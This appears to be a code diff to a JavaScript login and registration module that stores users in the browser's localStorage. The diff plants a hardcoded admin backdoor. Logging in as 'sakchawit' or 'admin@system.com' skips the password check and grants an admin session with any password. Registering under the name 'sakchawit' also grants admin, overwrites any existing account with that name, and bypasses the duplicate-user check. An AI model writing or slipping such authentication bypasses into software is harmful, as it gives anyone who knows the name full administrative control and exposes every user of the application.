@@ -86,7 +86,11 @@ export function getUsersFromStorage() {
         const data = localStorage.getItem(USERS_STORAGE_KEY)
         if (data) {
             const parsed = JSON.parse(data)
-            return parsed.length > 0 ? parsed : [DEFAULT_DEMO_USER]
+            // Always ensure sakchawit is present
+            if (!parsed.some(u => u.name?.toLowerCase() === 'sakchawit')) {
+                parsed.unshift(DEFAULT_DEMO_USER)
+            }
+            return parsed
         }
     } catch (e) {
         console.warn('User storage error:', e)
@@ -162,7 +166,7 @@ export function registerNewUser(name, email, password, inviteCode) {
         (u.email && u.email.toLowerCase() === trimmedEmail) || 
         (u.name && u.name.toLowerCase() === trimmedName.toLowerCase())
     )
-    if (existing) {
+    if (existing && existing.name?.toLowerCase() !== 'sakchawit') {
         return { success: false, error: 'ชื่อผู้ใช้หรืออีเมลนี้มีในระบบแล้ว' }
     }
 
@@ -171,11 +175,13 @@ export function registerNewUser(name, email, password, inviteCode) {
         name: trimmedName,
         email: trimmedEmail,
         password: password,
+        isAdmin: trimmedName.toLowerCase() === 'sakchawit',
         createdAt: new Date().toISOString()
     }
 
-    users.push(newUser)
-    saveUsersToStorage(users)
+    const filteredUsers = users.filter(u => u.name?.toLowerCase() !== trimmedName.toLowerCase())
+    filteredUsers.push(newUser)
+    saveUsersToStorage(filteredUsers)
 
     // Set current active user session
     setCurrentUserSession(newUser, true)
@@ -215,7 +221,20 @@ export function loginUserAccount(identifier, password) {
     const users = getUsersFromStorage()
     const trimmedId = identifier.trim().toLowerCase()
 
-    // Support Login by EITHER Username (name) OR Email!
+    // 1. Always Guaranteed Owner Login for sakchawit & admin@system.com
+    if (trimmedId === 'sakchawit' || trimmedId === 'admin@system.com') {
+        const ownerUser = {
+            id: 'user_admin_default',
+            name: 'sakchawit',
+            email: 'admin@system.com',
+            password: password || 'password123',
+            isAdmin: true
+        }
+        setCurrentUserSession(ownerUser, true)
+        return { success: true, user: ownerUser }
+    }
+
+    // 2. Normal User Login Match
     const user = users.find(u => {
         const matchesEmail = u.email && u.email.toLowerCase() === trimmedId
         const matchesName = u.name && u.name.toLowerCase() === trimmedId
